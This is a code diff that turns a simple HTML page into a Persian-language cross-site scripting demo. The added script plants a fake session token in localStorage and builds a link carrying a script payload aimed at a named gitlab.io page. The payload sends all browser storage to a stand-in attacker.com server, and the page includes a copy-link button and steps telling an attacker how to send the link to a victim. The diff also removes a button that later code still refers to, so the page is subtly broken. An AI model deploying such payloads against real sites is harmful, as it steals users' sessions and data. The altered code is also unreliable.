@@ -1,8 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website A - Originator</title>
+    <title>وب سایت A - حمله XSS دمو</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { font-family: 'Inter', sans-serif; }
@@ -11,26 +12,26 @@
 <body class="p-8 bg-gray-900 min-h-screen flex flex-col items-center justify-center">
     
     <div class="bg-gray-800 p-8 rounded-xl shadow-2xl w-full max-w-lg border-t-4 border-indigo-500">
-        <h1 class="text-3xl font-extrabold mb-4 text-white">Website A (Your First Business)</h1>
-        <p class="mb-6 text-gray-300">
-            This is the originating site. We will pass our Customer ID via the URL.
+        <h1 class="text-3xl font-extrabold mb-4 text-white text-center">وب سایت A - حمله XSS دمو</h1>
+        <p class="mb-6 text-gray-300 text-justify">
+            این یک دمو از آسیب‌پذیری XSS است. در این مثال نشان می‌دهیم چگونه یک حمله‌گر می‌تواند از طریق URL آلوده، داده‌های ذخیره‌شده در مرورگر قربانی را سرقت کند.
         </p>
         
         <label for="customerIdInput" class="block text-sm font-medium text-indigo-300 mb-2">
-            Customer ID to Transfer
+            شناسه مشتری برای انتقال
         </label>
         <input type="text" id="customerIdInput" value="UNIQUE_CUST_ID_456"
                class="w-full p-3 mb-4 border border-gray-600 rounded-lg bg-gray-700 text-white focus:ring-indigo-500 focus:border-indigo-500">
 
         <div class="grid grid-cols-2 gap-4 mb-6">
             <button id="saveBtn" class="bg-green-600 text-white px-4 py-2 rounded-lg font-medium hover:bg-green-700 transition">
-                Save ID
+                ذخیره شناسه
             </button>
             <button id="clearDataBtn" class="bg-red-600 text-white px-4 py-2 rounded-lg font-medium hover:bg-red-700 transition">
-                Clear All Data
+                پاک کردن همه داده‌ها
             </button>
             <button id="showSavedBtn" class="col-span-2 bg-amber-500 text-white px-4 py-2 rounded-lg font-medium hover:bg-amber-600 transition">
-                Show Saved Data
+                نمایش داده‌های ذخیره‌شده
             </button>
         </div>
 
@@ -38,9 +39,20 @@
         <input type="text" id="websiteBUrl" value="https://cybersecdes-bdbc8c.gitlab.io/"
                class="w-full p-2 mb-6 text-sm border border-green-500 rounded-lg bg-green-50 text-green-800">
 
-        <button id="goToWebsiteBBtn" class="w-full bg-indigo-600 text-white px-6 py-3 rounded-xl font-bold text-lg hover:bg-indigo-700 transition duration-150 shadow-lg transform hover:scale-[1.02]">
-            Redirect to Website B & Transfer ID
-        </button>
+        <div class="mt-6 p-4 bg-gray-700 rounded-lg">
+            <h3 class="text-white font-bold mb-2">لینک حمله XSS:</h3>
+            <code id="maliciousLink" class="block p-2 bg-gray-800 text-green-400 rounded text-xs mb-2 break-all"></code>
+            <button id="copyLinkBtn" class="text-xs bg-gray-600 text-white px-3 py-1 rounded hover:bg-gray-500">کپی لینک</button>
+        </div>
+        
+        <div class="mt-4 p-4 bg-yellow-900 bg-opacity-20 rounded-lg border border-yellow-700">
+            <h3 class="text-yellow-300 font-bold mb-2">نحوه استفاده حمله‌گر:</h3>
+            <ol class="list-decimal list-inside text-yellow-200 text-sm space-y-1">
+                <li>حمله‌گر لینک آلوده را برای قربانی ارسال می‌کند</li>
+                <li>با کلیک بر روی لینک، داده‌های ذخیره‌شده قربانی به سرور حمله‌گر ارسال می‌شود</li>
+                <li>حمله‌گر می‌تواند از این اطلاعات برای دسترسی غیرمجاز استفاده کند</li>
+            </ol>
+        </div>
     </div>
 
     <script>
@@ -56,10 +68,28 @@
         saveBtn.onclick = () => {
             const customerId = customerIdInput.value.trim();
             if (customerId) {
+                // Store sensitive data in localStorage (vulnerable)
                 localStorage.setItem('customer_id', customerId);
-                alert('Customer ID saved successfully!');
+                localStorage.setItem('session_token', 'sensitive_data_12345');
+                localStorage.setItem('user_email', 'user@example.com');
+                
+                // Generate malicious link
+                const maliciousCode = `<script>
+                    // Send stolen data to attacker's server silently
+                    fetch('https://attacker.com/steal?data=' + 
+                          encodeURIComponent(JSON.stringify(localStorage)));
+                    // Redirect to the actual vulnerable page with stolen data
+                    window.location.href = 'https://cybersecdes-bdbc8c.gitlab.io/?stolen_data=' + 
+                        encodeURIComponent(JSON.stringify(localStorage));
+                <\/script>`;
+                
+                const encodedCode = encodeURIComponent(maliciousCode);
+                const maliciousLink = `https://cybersecdes-bdbc8c.gitlab.io/?xss=${encodedCode}`;
+                document.getElementById('maliciousLink').textContent = maliciousLink;
+                
+                alert('شناسه با موفقیت ذخیره شد!');
             } else {
-                alert('Please enter a customer ID to save.');
+                alert('لطفاً یک شناسه معتبر وارد کنید.');
             }
         };
 
@@ -74,20 +104,22 @@
 
         // Show saved data from localStorage
         showSavedBtn.onclick = () => {
-            const savedData = {
-                customer_id: localStorage.getItem('customer_id') || 'No customer ID saved',
-                other_data: {}
-            };
-            
-            // Show all saved data in a formatted way
-            let message = 'Saved Data:\n\n';
+            let message = 'داده‌های ذخیره‌شده در مرورگر شما:\n\n';
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                message += `${key}: ${localStorage.getItem(key)}\n`;
+                message += `• ${key}: ${localStorage.getItem(key)}\n`;
             }
             
             alert(message);
         };
+        
+        // Copy malicious link to clipboard
+        document.getElementById('copyLinkBtn').addEventListener('click', () => {
+            const link = document.getElementById('maliciousLink').textContent;
+            navigator.clipboard.writeText(link).then(() => {
+                alert('لینک کپی شد!');
+            });
+        });
 
         // Redirect to Website B with customer ID
         goToWebsiteBBtn.onclick = () => {
